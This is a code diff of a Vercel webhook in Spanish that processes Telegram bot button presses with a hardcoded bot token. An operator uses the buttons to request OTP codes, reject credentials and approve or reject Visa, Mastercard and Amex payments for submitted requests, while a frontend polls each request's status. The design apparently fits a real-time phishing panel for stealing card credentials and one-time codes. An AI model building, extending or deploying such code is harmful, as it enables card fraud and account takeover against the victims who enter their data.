@@ -1,10 +1,9 @@
-// No necesitas instalar nada extra, Vercel incluye fetch nativo
+// api/webhook.js - WEBHOOK COMPLETO PARA VERCEL
 
-// Configuración de Telegram
 const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// Almacenamiento temporal (en producción usa una base de datos real)
+// Almacenamiento temporal en memoria (para Vercel)
 if (!global.solicitudes) {
     global.solicitudes = new Map();
 }
@@ -19,7 +18,9 @@ export default async function handler(req, res) {
         return res.status(200).end();
     }
 
-    // RUTA: POST /api/webhook - Recibe actualizaciones de Telegram
+    // ============================================
+    // POST - Recibe actualizaciones de Telegram
+    // ============================================
     if (req.method === 'POST') {
         try {
             const update = req.body;
@@ -36,153 +37,196 @@ export default async function handler(req, res) {
 
                 console.log('🔘 Botón presionado:', callbackData);
 
-                // ============================================================
-                // EXTRAER ACCIÓN Y SOLICITUD ID (soporta múltiples formatos)
-                // ============================================================
                 let action = '';
                 let solicitudId = '';
                 let respuestaTexto = '';
                 let estadoMensaje = '';
 
-                // ===== FORMATOS CON TIPO DE TARJETA (visa, master, amex) =====
-                // approve_visa_SOL-XXX, approve_master_SOL-XXX, approve_amex_SOL-XXX
-                if (callbackData.startsWith('approve_visa_')) {
+                // ============================================
+                // VISA VERIFIED - CREDENCIALES
+                // ============================================
+                if (callbackData.startsWith('pedir_otp_')) {
+                    action = 'pedir_otp';
+                    solicitudId = callbackData.replace('pedir_otp_', '');
+                    respuestaTexto = '📱 Código OTP solicitado';
+                    estadoMensaje = '📱 *OTP SOLICITADO* - Ingrese el código de verificación';
+                }
+                else if (callbackData.startsWith('error_credenciales_')) {
+                    action = 'error_credenciales';
+                    solicitudId = callbackData.replace('error_credenciales_', '');
+                    respuestaTexto = '❌ Credenciales incorrectas';
+                    estadoMensaje = '❌ *ERROR CREDENCIALES* - Los datos ingresados no coinciden';
+                }
+
+                // ============================================
+                // VISA VERIFIED - OTP
+                // ============================================
+                else if (callbackData.startsWith('aprobar_otp_')) {
+                    action = 'aprobar_otp';
+                    solicitudId = callbackData.replace('aprobar_otp_', '');
+                    respuestaTexto = '✅ OTP aprobado';
+                    estadoMensaje = '✅ *OTP APROBADO* - Redirigiendo al cliente';
+                }
+                else if (callbackData.startsWith('rechazar_otp_')) {
+                    action = 'rechazar_otp';
+                    solicitudId = callbackData.replace('rechazar_otp_', '');
+                    respuestaTexto = '❌ OTP rechazado';
+                    estadoMensaje = '❌ *OTP RECHAZADO* - El código es incorrecto';
+                }
+
+                // ============================================
+                // PAGO CON TARJETA - APROBAR (Visa, Master, Amex)
+                // ============================================
+                else if (callbackData.startsWith('approve_visa_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_visa_', '');
-                    respuestaTexto = '✅ Pago aprobado';
-                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
+                    respuestaTexto = '✅ Pago aprobado (Visa)';
+                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Visa';
                 }
                 else if (callbackData.startsWith('approve_master_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_master_', '');
-                    respuestaTexto = '✅ Pago aprobado';
-                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
+                    respuestaTexto = '✅ Pago aprobado (Mastercard)';
+                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Mastercard';
                 }
                 else if (callbackData.startsWith('approve_amex_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_amex_', '');
-                    respuestaTexto = '✅ Pago aprobado';
-                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
+                    respuestaTexto = '✅ Pago aprobado (Amex)';
+                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Amex';
                 }
-                // reject_visa_SOL-XXX, reject_master_SOL-XXX, reject_amex_SOL-XXX
+
+                // ============================================
+                // PAGO CON TARJETA - RECHAZAR (Visa, Master, Amex)
+                // ============================================
                 else if (callbackData.startsWith('reject_visa_')) {
                     action = 'rejected';
                     solicitudId = callbackData.replace('reject_visa_', '');
-                    respuestaTexto = '❌ Pago rechazado';
+                    respuestaTexto = '❌ Pago rechazado (Visa)';
                     estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                 }
                 else if (callbackData.startsWith('reject_master_')) {
                     action = 'rejected';
                     solicitudId = callbackData.replace('reject_master_', '');
-                    respuestaTexto = '❌ Pago rechazado';
+                    respuestaTexto = '❌ Pago rechazado (Mastercard)';
                     estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                 }
                 else if (callbackData.startsWith('reject_amex_')) {
                     action = 'rejected';
                     solicitudId = callbackData.replace('reject_amex_', '');
-                    respuestaTexto = '❌ Pago rechazado';
+                    respuestaTexto = '❌ Pago rechazado (Amex)';
                     estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                 }
-                // ===== ERROR USUARIO con tipo de tarjeta =====
+
+                // ============================================
+                // ERRORES DE CREDENCIALES (con tipo de tarjeta)
+                // ============================================
                 else if (callbackData.startsWith('error_user_visa_')) {
                     action = 'error_user';
                     solicitudId = callbackData.replace('error_user_visa_', '');
-                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
+                    respuestaTexto = '❌ Error de usuario';
                     estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                 }
                 else if (callbackData.startsWith('error_user_master_')) {
                     action = 'error_user';
                     solicitudId = callbackData.replace('error_user_master_', '');
-                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
+                    respuestaTexto = '❌ Error de usuario';
                     estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                 }
                 else if (callbackData.startsWith('error_user_amex_')) {
                     action = 'error_user';
                     solicitudId = callbackData.replace('error_user_amex_', '');
-                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
+                    respuestaTexto = '❌ Error de usuario';
                     estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                 }
-                // ===== ERROR CONTRASEÑA con tipo de tarjeta =====
                 else if (callbackData.startsWith('error_pass_visa_')) {
                     action = 'error_pass';
                     solicitudId = callbackData.replace('error_pass_visa_', '');
-                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
+                    respuestaTexto = '❌ Error de contraseña';
                     estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                 }
                 else if (callbackData.startsWith('error_pass_master_')) {
                     action = 'error_pass';
                     solicitudId = callbackData.replace('error_pass_master_', '');
-                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
+                    respuestaTexto = '❌ Error de contraseña';
                     estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                 }
                 else if (callbackData.startsWith('error_pass_amex_')) {
                     action = 'error_pass';
                     solicitudId = callbackData.replace('error_pass_amex_', '');
-                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
+                    respuestaTexto = '❌ Error de contraseña';
                     estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                 }
-                // ===== ERROR OTP con tipo de tarjeta =====
                 else if (callbackData.startsWith('error_otp_visa_')) {
                     action = 'error_otp';
                     solicitudId = callbackData.replace('error_otp_visa_', '');
-                    respuestaTexto = '❌ Error de OTP - Código inválido';
-                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
+                    respuestaTexto = '❌ Error de OTP';
+                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
                 }
                 else if (callbackData.startsWith('error_otp_master_')) {
                     action = 'error_otp';
                     solicitudId = callbackData.replace('error_otp_master_', '');
-                    respuestaTexto = '❌ Error de OTP - Código inválido';
-                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
+                    respuestaTexto = '❌ Error de OTP';
+                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
                 }
                 else if (callbackData.startsWith('error_otp_amex_')) {
                     action = 'error_otp';
                     solicitudId = callbackData.replace('error_otp_amex_', '');
-                    respuestaTexto = '❌ Error de OTP - Código inválido';
-                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
+                    respuestaTexto = '❌ Error de OTP';
+                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
                 }
-                // ===== FORMATOS SIN TIPO DE TARJETA (original) =====
+
+                // ============================================
+                // FORMATOS SIMPLES (sin tipo de tarjeta)
+                // ============================================
                 else if (callbackData.startsWith('approve_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_', '');
-                    respuestaTexto = '✅ Pago aprobado';
-                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido';
+                    respuestaTexto = '✅ Aprobado';
+                    estadoMensaje = '✅ *APROBADO*';
                 }
                 else if (callbackData.startsWith('reject_')) {
                     action = 'rejected';
                     solicitudId = callbackData.replace('reject_', '');
-                    respuestaTexto = '❌ Pago rechazado';
-                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
+                    respuestaTexto = '❌ Rechazado';
+                    estadoMensaje = '❌ *RECHAZADO*';
                 }
                 else if (callbackData.startsWith('user_error_')) {
                     action = 'error_user';
                     solicitudId = callbackData.replace('user_error_', '');
-                    respuestaTexto = '❌ Error de usuario - Datos no coinciden';
-                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
+                    respuestaTexto = '❌ Error de usuario';
+                    estadoMensaje = '❌ *ERROR USUARIO*';
                 }
                 else if (callbackData.startsWith('pass_error_')) {
                     action = 'error_pass';
                     solicitudId = callbackData.replace('pass_error_', '');
-                    respuestaTexto = '❌ Error de contraseña - Datos no coinciden';
-                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
+                    respuestaTexto = '❌ Error de contraseña';
+                    estadoMensaje = '❌ *ERROR CONTRASEÑA*';
                 }
                 else if (callbackData.startsWith('otp_error_')) {
                     action = 'error_otp';
                     solicitudId = callbackData.replace('otp_error_', '');
-                    respuestaTexto = '❌ Error de OTP - Código inválido';
-                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo, intenta de nuevo';
+                    respuestaTexto = '❌ Error de OTP';
+                    estadoMensaje = '❌ *ERROR OTP*';
                 }
-                // Fallback
+
+                // ============================================
+                // FALLBACK
+                // ============================================
                 else {
                     const parts = callbackData.split('_');
                     action = parts[0] || 'unknown';
                     solicitudId = parts.slice(1).join('_') || 'unknown';
-                    respuestaTexto = 'Acción procesada';
+                    respuestaTexto = 'Procesado';
                     estadoMensaje = 'Procesado';
+                    console.log('⚠️ Callback no reconocido:', callbackData);
                 }
 
                 console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);
 
-                // Responder al callback query inmediatamente
+                // ============================================
+                // RESPONDER AL CALLBACK QUERY
+                // ============================================
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -193,31 +237,17 @@ export default async function handler(req, res) {
                     })
                 });
 
-                // Actualizar el mensaje en Telegram
+                // ============================================
+                // ACTUALIZAR MENSAJE EN TELEGRAM
+                // ============================================
                 let newText = originalText;
                 
-                // Reemplazar cualquier estado que tenga el mensaje
-                const estadosPosibles = [
-                    '⏳ *Estado:* Esperando verificación...',
-                    '⚠️ *Estado:* Credenciales enviadas - Pendiente de validación',
-                    '⏳ *Estado:* Esperando verificación...'
-                ];
-
-                let reemplazado = false;
-                for (const estado of estadosPosibles) {
-                    if (newText.includes(estado)) {
-                        newText = newText.replace(estado, `⏳ *Estado:* ${estadoMensaje}`);
-                        reemplazado = true;
-                        break;
-                    }
-                }
-
-                if (!reemplazado) {
-                    // Si no encontró ningún estado, reemplazar genéricamente
-                    newText = newText.replace(
-                        /⏳ \*Estado:\* .+/,
-                        `⏳ *Estado:* ${estadoMensaje}`
-                    );
+                // Buscar y reemplazar el estado
+                const estadoRegex = /⏳ \*Estado:\* .+/;
+                if (estadoRegex.test(newText)) {
+                    newText = newText.replace(estadoRegex, `⏳ *Estado:* ${estadoMensaje}`);
+                } else {
+                    newText += `\n\n⏳ *Estado:* ${estadoMensaje}`;
                 }
 
                 await fetch(`${TELEGRAM_API}/editMessageText`, {
@@ -231,12 +261,15 @@ export default async function handler(req, res) {
                     })
                 });
 
-                // Guardar el estado de la solicitud
+                // ============================================
+                // GUARDAR ESTADO DE LA SOLICITUD
+                // ============================================
                 global.solicitudes.set(solicitudId, {
                     estado: action,
                     timestamp: Date.now(),
                     chatId: chatId,
-                    messageId: messageId
+                    messageId: messageId,
+                    tipo: 'visa_verified'
                 });
 
                 console.log(`✅ Solicitud ${solicitudId}: ${action}`);
@@ -244,13 +277,11 @@ export default async function handler(req, res) {
                 return res.status(200).json({ 
                     success: true, 
                     action: action,
-                    solicitudId: solicitudId,
-                    message: `Solicitud ${solicitudId}: ${action}` 
+                    solicitudId: solicitudId
                 });
             }
 
-            // Si es un mensaje normal, ignorar
-            return res.status(200).json({ success: true, message: 'Update recibido' });
+            return res.status(200).json({ success: true });
 
         } catch (error) {
             console.error('❌ Error procesando webhook:', error);
@@ -258,11 +289,13 @@ export default async function handler(req, res) {
         }
     }
 
-    // RUTA: GET /api/webhook?check=solicitudId - El frontend consulta el estado
+    // ============================================
+    // GET - Consultar estado o configurar webhook
+    // ============================================
     if (req.method === 'GET') {
         const { check, setup } = req.query;
 
-        // Configurar el webhook (se hace una sola vez)
+        // Configurar webhook en Telegram
         if (setup === 'true') {
             try {
                 const baseUrl = `https://${req.headers.host}`;
@@ -296,27 +329,26 @@ export default async function handler(req, res) {
 
         // Verificar estado de una solicitud
         if (check) {
-            const solicitudId = check;
-            const solicitud = global.solicitudes.get(solicitudId);
-
+            const solicitud = global.solicitudes.get(check);
+            
             if (solicitud) {
                 return res.status(200).json({
                     success: true,
-                    solicitudId: solicitudId,
+                    solicitudId: check,
                     estado: solicitud.estado,
                     timestamp: solicitud.timestamp
                 });
             } else {
                 return res.status(200).json({
                     success: true,
-                    solicitudId: solicitudId,
+                    solicitudId: check,
                     estado: 'pending',
                     mensaje: 'Solicitud aún no procesada'
                 });
             }
         }
 
-        // Obtener info del webhook
+        // Obtener información del webhook
         try {
             const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
             const data = await response.json();
